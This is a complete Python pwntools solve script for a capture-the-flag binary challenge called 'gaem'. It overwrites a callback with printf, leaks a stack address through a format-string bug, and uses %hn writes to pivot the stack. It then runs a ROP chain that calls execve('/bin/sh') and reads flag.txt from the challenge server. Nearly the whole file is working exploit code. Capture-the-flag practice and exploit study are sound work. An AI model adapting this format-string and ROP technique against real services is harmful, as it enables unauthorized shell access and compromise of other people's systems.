#!/usr/bin/env python3

from __future__ import annotations

import re
import sys

from pwn import context, flat, process, remote, p64


context.log_level = "error"

HOST = "challs.squ1rrel.dev"
PORT = 5001

PRINTF = 0x4056B0
POP_RDI = 0x40224F
POP_RSI = 0x40224D
POP_RDX = 0x4772DC
POP_RAX = 0x4309DB
POP_RSP = 0x401C8E
SYSCALL = 0x453B02

FLAG_RE = re.compile(rb"squ1rrel\{[^}]+\}")


def recv_menu(io) -> bytes:
    return io.recvuntil(b"> ")


def recv_talk_prompt(io) -> None:
    io.recvuntil(b": ")


def overwrite_callback_with_printf(io) -> None:
    recv_menu(io)
    io.sendline(b"m")
    io.recvuntil(b"> ")
    io.sendline(b"ssdr")
    io.recvuntil(b"Whisper a new name for Whiskers: ")
    io.sendline(b"A" * 32 + p64(PRINTF)[:3])


def leak_talk_buffer(io) -> int:
    recv_menu(io)
    io.sendline(b"t")
    recv_talk_prompt(io)
    io.sendline(b"%7$p")
    line = io.recvline(timeout=2).strip()
    match = re.search(rb"0x[0-9a-fA-F]+", line)
    if not match:
        raise RuntimeError(f"failed to leak talk buffer: {line!r}")
    return int(match.group(0), 16)


def write_pivot(io, talk_buf: int) -> None:
    saved_rip = talk_buf + 0x158
    saved_next = talk_buf + 0x160
    pivot = talk_buf + 0x32

    def send_fmt(fmt: bytes, *targets: int) -> None:
        if len(fmt) >= 32:
            raise RuntimeError(f"format payload too large: {len(fmt)}")
        payload = fmt + b"\x00" + b"B" * (32 - len(fmt) - 1)
        for target in targets:
            payload += p64(target)

        recv_menu(io)
        io.sendline(b"t")
        recv_talk_prompt(io)
        io.sendline(payload)

    pivot_low = pivot & 0xFFFF
    pivot_mid = (pivot >> 16) & 0xFFFF
    pad1 = pivot_low
    pad2 = (pivot_mid - pivot_low) & 0xFFFF
    if pad2 == 0:
        pad2 = 0x10000
    send_fmt(f"%1${pad1}c%20$hn%1${pad2}c%21$hn".encode(), saved_next, saved_next + 2)

    rip_low = POP_RSP & 0xFFFF
    send_fmt(f"%1${rip_low}c%20$hn".encode(), saved_rip)

    rip_mid = (POP_RSP >> 16) & 0xFFFF
    send_fmt(f"%1${rip_mid}c%20$hn".encode(), saved_rip + 2)


def stage_chain(io, talk_buf: int) -> None:
    talk_input = talk_buf + 0x30
    chain = flat(
        POP_RDI,
        talk_input + 0x72,
        POP_RSI,
        0,
        0,
        POP_RDX,
        0,
        0,
        0,
        0,
        0,
        POP_RAX,
        59,
        SYSCALL,
        word_size=64,
        endianness="little",
    )
    if len(chain) != 0x70:
        raise RuntimeError(f"unexpected chain length: {len(chain)}")

    payload = b"A\x00" + chain + b"/bin/sh\x00"
    if len(payload) >= 0x80:
        raise RuntimeError(f"unexpected talk payload length: {len(payload)}")

    recv_menu(io)
    io.sendline(b"t")
    recv_talk_prompt(io)
    io.sendline(payload)


def exploit(io) -> bytes:
    io.recvuntil(b"Hero's name: ")
    io.sendline(b"hero")

    overwrite_callback_with_printf(io)
    talk_buf = leak_talk_buffer(io)
    write_pivot(io, talk_buf)
    stage_chain(io, talk_buf)

    recv_menu(io)
    io.sendline(b"q")
    output = io.recv(timeout=1)
    io.sendline(b"cat flag.txt")
    io.sendline(b"exit")
    output += io.recvall(timeout=5)
    return output


def main(argv: list[str]) -> int:
    mode = argv[1] if len(argv) > 1 else "remote"

    if mode == "local":
        io = process(["./starting_files/gaem"])
    elif mode == "remote":
        io = remote(HOST, PORT)
    else:
        print("usage: solve.py [local|remote]", file=sys.stderr)
        return 2

    try:
        output = exploit(io)
    finally:
        io.close()

    sys.stdout.write(output.decode("latin1", "replace"))
    match = FLAG_RE.search(output)
    if match:
        sys.stdout.write(f"flag: {match.group().decode()}\n")
        return 0

    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))